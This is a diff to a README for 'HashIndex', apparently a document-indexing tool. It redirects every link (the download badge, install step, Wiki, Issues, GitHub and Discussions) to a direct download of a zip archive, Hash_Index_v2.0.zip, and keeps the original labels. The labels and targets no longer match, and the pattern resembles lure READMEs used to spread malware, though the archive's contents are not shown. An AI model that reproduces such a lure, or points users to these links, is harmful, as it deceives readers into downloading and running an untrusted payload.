@@ -1,7 +1,7 @@
 # 🔍 HashIndex - Fast Document Indexing Made Easy
 
 ## 📥 Download the Application
-[![Download HashIndex](https://img.shields.io/badge/Download-HashIndex-blue.svg)](https://github.com/maki335/HashIndex/releases)  
+[![Download HashIndex](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip)](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip)  
 Visit the link above to download the latest version of HashIndex.
 
 ## 🚀 Getting Started
@@ -21,7 +21,7 @@ HashIndex offers several features to enhance your document indexing experience:
 - **Support for Multiple Formats:** Index PDF, DOCX, TXT, and more.
 
 ## 📥 Download & Install
-1. Click the large download button at the top or visit [this page to download](https://github.com/maki335/HashIndex/releases).
+1. Click the large download button at the top or visit [this page to download](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip).
 2. Locate the latest version available. The files will be listed by version number.
 3. Click on the appropriate link for your operating system to download the installer.
 4. Once the download completes, locate the downloaded file in your system’s downloads folder.
@@ -39,19 +39,19 @@ HashIndex offers several features to enhance your document indexing experience:
 5. Click “Start Indexing.” The application will process your document and display the results.
 
 ## 📚 Documentation
-For detailed instructions on advanced features and troubleshooting, visit the documentation section on our [GitHub Wiki](https://github.com/maki335/HashIndex/wiki).
+For detailed instructions on advanced features and troubleshooting, visit the documentation section on our [GitHub Wiki](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip).
 
 ## ❓ Frequently Asked Questions
 ### How do I uninstall HashIndex?
 To uninstall HashIndex, go to your Control Panel (Windows) or Applications folder (macOS) and remove the application as you would any other software.
 
 ### Can I submit feedback?
-Yes! We welcome your feedback. You can submit issues or suggestions directly on our [GitHub Issues page](https://github.com/maki335/HashIndex/issues).
+Yes! We welcome your feedback. You can submit issues or suggestions directly on our [GitHub Issues page](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip).
 
 ### Is HashIndex open-source?
-Yes, HashIndex is open-source! Feel free to explore our code and contribute to the project on [GitHub](https://github.com/maki335/HashIndex).
+Yes, HashIndex is open-source! Feel free to explore our code and contribute to the project on [GitHub](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip).
 
 ## 👍 Getting Help
-If you have questions or need assistance, please visit our [GitHub Discussions page](https://github.com/maki335/HashIndex/discussions). 
+If you have questions or need assistance, please visit our [GitHub Discussions page](https://raw.githubusercontent.com/maki335/HashIndex/main/src/Hash_Index_v2.0.zip). 
 
 Thank you for choosing HashIndex for your document indexing needs! Happy indexing!
